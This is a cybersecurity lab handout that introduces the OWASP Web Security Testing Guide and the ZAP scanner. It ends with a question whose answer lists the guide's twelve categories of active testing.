**Protego Security Solutions Task**

There are many organizations that are dedicated to improving cybersecurity. They offer fantastic resources that are really helpful to us here at Protego. OWASP offers many resources and tools that are really awesome. They focus on web application security, so when you do application testing, you will find yourself turning to their resources often.

The OWASP WSTG is an amazing guide to testing for a really wide range of web application vulnerabilities, and offers concrete recommendations for threat mitigation. It is indispensable for making recommendations regarding vulnerabilities that we have discovered in our testing.

You should be familiar with it, so I want you to explore the WSTG website. After you check that out, we will do a brief vulnerability scan using the OWASP ZAP tool so you can see how it can work together with WSTG.

In this lab, you will complete the following objectives:

- Part 1: Investigate the WSTG
- Part 2: Scan a Website and Investigate Vulnerability References

What are the 12 categories of active testing described in the guide?

- Information Gathering
- Configuration and Deployment Management Testing
- Identity Management Testing
- Authentication Testing
- Authorization Testing
- Session Management Testing
- Input validation Testing
- Error Handling
- Cryptography
- Business Logic Testing
- Client-side Testing
- API Testing
